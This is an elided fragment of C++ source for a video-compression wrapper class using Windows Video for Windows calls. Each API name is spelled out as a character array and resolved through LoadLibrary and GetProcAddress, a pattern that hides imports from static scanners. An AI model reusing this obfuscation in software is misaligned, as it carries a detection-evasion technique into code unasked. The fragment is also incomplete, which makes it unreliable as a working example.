...
public:
	...
	bool InitCompressor(BITMAPINFO*	lpbmi, DWORD fccHandler)
	{
		...
		char DYrEN19[] = {'I','C','O','p','e','n','\0'};
		ICOpenT pICOpen=(ICOpenT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN19);
		...
		// 向编码器发送验证
		char DYrEN18[] = {'I','C','S','e','n','d','M','e','s','s','a','g','e','\0'};
		ICSendMessageT pICSendMessage=(ICSendMessageT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN18);
		pICSendMessage(m_hIC, 0x60c9, 0xf7329ace, 0xacdeaea2);
		
		m_cv.hic = m_hIC;
		m_cv.dwFlags = ICMF_COMPVARS_VALID;
		
		char DYrEN17[] = {'I','C','S','e','q','C','o','m','p','r','e','s','s','F','r','a','m','e','S','t','a','r','t','\0'};
		ICSeqCompressFrameStartT pICSeqCompressFrameStart=(ICSeqCompressFrameStartT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN17);
	...
	BOOL EncodeVideoData(BYTE* pin, int len, BYTE* pout, int* lenr, BOOL* pKey)
	{
		...
		char RZMrh01[] = {'I','C','S','e','q','C','o','m','p','r','e','s','s','F','r','a','m','e','\0'};
		ICSeqCompressFrameT pICSeqCompressFrame=(ICSeqCompressFrameT)GetProcAddress(LoadLibrary("MSVFW32.dll"),RZMrh01);
	...
	virtual ~CVideoCodec()
	{
		...
		char DYrEN20[] = {'I','C','C','l','o','s','e','\0'};
		ICCloseT pICClose=(ICCloseT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN20);
		char DYrEN21[] = {'I','C','C','o','m','p','r','e','s','s','o','r','F','r','e','e','\0'};
		ICCompressorFreeT pICCompressorFree=(ICCompressorFreeT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN21);
		char DYrEN22[] = {'I','C','S','e','q','C','o','m','p','r','e','s','s','F','r','a','m','e','E','n','d','\0'};
		ICSeqCompressFrameEndT pICSeqCompressFrameEnd=(ICSeqCompressFrameEndT)GetProcAddress(LoadLibrary("MSVFW32.dll"),DYrEN22);
